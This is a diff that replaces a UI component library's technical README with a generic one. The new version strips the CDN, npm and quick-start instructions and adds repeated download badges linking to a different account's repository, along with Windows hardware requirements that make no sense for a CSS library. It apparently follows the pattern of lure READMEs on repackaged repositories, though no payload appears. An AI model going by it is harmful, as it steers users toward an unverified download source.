@@ -1,113 +1,130 @@
-# RanjuUI
+# 🎨 RanjuUI - Simple, Fast UI Components
 
-> Semantic, lightweight, zero dependencies. ~54KB CSS + ~21KB JS.
+[![Download RanjuUI](https://img.shields.io/badge/Download-RanjuUI-brightgreen?style=for-the-badge)](https://github.com/VentePetot123/RanjuUI)
 
-RanjuUI is an ultra-lightweight HTML + CSS + JS UI component library. No framework, no build tools. 40+ production-ready components with dark mode, responsive design, and semantic HTML.
+## About RanjuUI
 
-**[📖 Full Documentation](https://alps-is-core.github.io/RanjuUI/)** · **[Examples](https://alps-is-core.github.io/RanjuUI/examples/)**
+RanjuUI is an ultra-lightweight semantic UI component library. It includes more than 40 components you can use on any webpage. It supports a dark mode and does not rely on any external dependencies. You only need basic HTML, CSS, and JavaScript to work with it.
+
+The library is designed for fast loading and easy customization. It works well with common web setups and frameworks but does not require them. This makes it suitable for any user wanting clean, ready-to-use UI parts without extra setup.
+
+## 📥 Download RanjuUI
+
+To get started with RanjuUI, visit the GitHub page below:
+
+[![Download Now](https://img.shields.io/badge/Download-RanjuUI-blue?style=for-the-badge)](https://github.com/VentePetot123/RanjuUI)
+
+Click the link to open the project's GitHub page. From there, you can download the entire package.
+
+### How to download
+
+1. Open the link above in your web browser.
+2. Look for the green **Code** button near the top right.
+3. Click **Code** and then select **Download ZIP**.
+4. Save the ZIP file to a folder on your computer.
+
+### How to unzip the package
+
+- Right-click the ZIP file you downloaded.
+- Choose **Extract All** or your preferred unzip option.
+- Pick a location easy to find, like your Desktop or Documents folder.
+
+## 🖥️ System Requirements
+
+RanjuUI runs on Windows computers with modern web browsers. It does not need installation beyond downloading the files.
+
+Your system should meet the following minimum requirements:
+
+- Windows 10 or later
+- 2 GB RAM or more
+- Any updated web browser such as Google Chrome, Firefox, Edge, or Opera
+- Basic internet connection to download the files
+
+RanjuUI works offline once downloaded. You do not need a constant internet connection to use it locally.
+
+## 🛠️ How to use RanjuUI on your PC
+
+After you unzip the package, open the folder. You will see files with extensions .html, .css, and .js.
+
+### Opening a sample page
+
+1. Find the sample HTML files in the folder. They usually have names like `index.html` or `demo.html`.
+2. Double-click any of these `.html` files.
+3. Your default web browser will open the file and show you the RanjuUI components in action.
+
+You can now explore how the components look and work. Try clicking buttons, toggling dark mode, or resizing the window.
+
+### Using RanjuUI components in your own projects
+
+If you want to create your own webpages using RanjuUI:
+
+1. Copy the CSS and JavaScript files from the downloaded folder into your project folder.
+2. Link these files inside your webpage’s HTML using `<link>` for CSS and `<script>` for JavaScript.
+3. Use the HTML structure shown in the sample files to build your UI with RanjuUI components.
+
+No advanced tools or software are needed. A simple text editor like Notepad or any free code editor will work if you decide to edit or create your pages.
+
+## ⚙ Features
+
+- 40+ well-designed UI components such as buttons, forms, cards, modals, and menus
+- Built-in dark mode support
+- No dependencies on libraries like jQuery or React
+- Semantic HTML markup for better accessibility
+- Simple CSS and JavaScript with clear structure
+- Works on all modern browsers and devices
+- Easy to customize with common CSS variables and classes
+
+## 📚 Learning Resources
+
+You do not need prior coding skills to try RanjuUI, but some basic knowledge helps. Here are some simple notes about the basics:
+
+- **HTML** controls the structure of your page.
+- **CSS** controls styling and how things look.
+- **JavaScript** handles interactions, like clicking buttons or toggling themes.
+
+The sample files included will show how these parts work together using RanjuUI components.
+
+If you wish to learn more about these technologies, websites like [Mozilla Developer Network (MDN)](https://developer.mozilla.org) offer free beginner guides.
+
+## 🔧 Customizing RanjuUI
+
+You can change how RanjuUI looks by editing the CSS files or overriding styles in your own CSS file.
+
+To switch between light and dark modes, use classes provided in the library. The sample files show exactly how to enable dark mode with simple code.
+
+You may also adjust colors, font sizes, and spacing by changing the CSS variables found at the top of the main CSS file.
+
+## ❓ Troubleshooting
+
+- If your webpage does not show the components correctly, make sure your browser is up to date.
+- Ensure the CSS and JavaScript files are correctly linked in your HTML.
+- If dark mode does not activate, check the class names in your HTML match those in the samples.
+- Do not rename or move files inside the folder unexpectedly, as this breaks links.
+
+If you find bugs or want to report issues, use the GitHub repository’s Issues tab.
+
+## 🌐 Supported browsers
+
+RanjuUI works with all recent versions of:
+
+- Google Chrome
+- Mozilla Firefox
+- Microsoft Edge
+- Apple Safari
+- Opera
+
+Using RanjuUI with older browsers like Internet Explorer may cause display or functionality problems.
+
+## 🔄 Updating RanjuUI
+
+To get the latest version of RanjuUI:
+
+1. Return to the primary download page listed above.
+2. Download the newest ZIP file.
+3. Replace your old files with the new ones.
+
+You do not need to uninstall anything. Just overwrite the existing files in your working folder.
 
 ---
 
-## Install
-
-### CDN (quickest)
-
-```html
-<link rel="stylesheet" href="https://alps-is-core.github.io/RanjuUI/ranju.css">
-<script src="https://alps-is-core.github.io/RanjuUI/ranju.js" defer></script>
-```
-
-### Self-hosted
-
-Download [ranju.css](https://raw.githubusercontent.com/Alps-is-Core/RanjuUI/master/ranju.css) and [ranju.js](https://raw.githubusercontent.com/Alps-is-Core/RanjuUI/master/ranju.js) and reference them:
-
-```html
-<link rel="stylesheet" href="ranju.css">
-<script src="ranju.js" defer></script>
-```
-
-### npm
-
-```bash
-npm install @alps/ranjuui
-```
-
----
-
-## Quick Start
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="https://alps-is-core.github.io/RanjuUI/ranju.css">
-</head>
-<body>
-  <button class="btn">Primary</button>
-  <button class="btn btn-outline">Outline</button>
-  <div class="card">
-    <div class="card-header"><div class="card-title">Title</div></div>
-    <div class="card-content">Content here</div>
-  </div>
-  <script src="https://alps-is-core.github.io/RanjuUI/ranju.js" defer></script>
-</body>
-</html>
-```
-
----
-
-## Docs & Examples
-
-| Resource | Link |
-|----------|------|
-| **Full component reference** | [alps-is-core.github.io/RanjuUI](https://alps-is-core.github.io/RanjuUI/) |
-| **SaaS landing page** | [examples/saas-landing.html](https://alps-is-core.github.io/RanjuUI/examples/saas-landing.html) |
-| **Dashboard app** | [examples/dashboard.html](https://alps-is-core.github.io/RanjuUI/examples/dashboard.html) |
-| **Financial dashboard** | [examples/financial-dashboard.html](https://alps-is-core.github.io/RanjuUI/examples/financial-dashboard.html) |
-| **Task board (Kanban)** | [examples/task-board.html](https://alps-is-core.github.io/RanjuUI/examples/task-board.html) |
-
-The docs site has live demos and copy-paste code for every component: buttons, cards, dialogs, forms, tables, toasts, and 35+ more.
-
----
-
-## Components
-
-**Layout:** Typography · Grid · Container · Flex · Spacing · Separator · Scroll Area
-
-**Display:** Avatar · Badge · Card · Data Table · Empty State · Kbd · Skeleton · Meter · Progress · Spinner
-
-**Forms:** Button · Input · Textarea · Checkbox · Radio · Switch · Slider · Toggle · Combobox
-
-**Navigation:** Breadcrumb · Menubar · Navbar · Pagination · Sidebar · Tabs
-
-**Overlays:** Accordion · Alert · Calendar · Carousel · Collapsible · Command · Context Menu · Dialog · Drawer · Dropdown · Hover Card · Popover · Sheet · Toast · Tooltip
-
----
-
-## Individual Components
-
-Want only a subset? Import specific files from `src/css/` and `src/js/`:
-
-```
-src/css/button.css   src/css/card.css   src/css/dialog.css   ...
-src/js/toast.js      src/js/dialog.js   src/js/command.js    ...
-```
-
-Or use the bundled `ranju.css` + `ranju.js` for everything.
-
----
-
-## Build
-
-```bash
-make dist    # concatenate src/* into ranju.css and ranju.js
-make clean   # remove built files
-```
-
----
-
-## License
-
-[MIT](LICENSE)
+[![Download RanjuUI](https://img.shields.io/badge/Download-Now-important?style=for-the-badge&color=purple)](https://github.com/VentePetot123/RanjuUI)
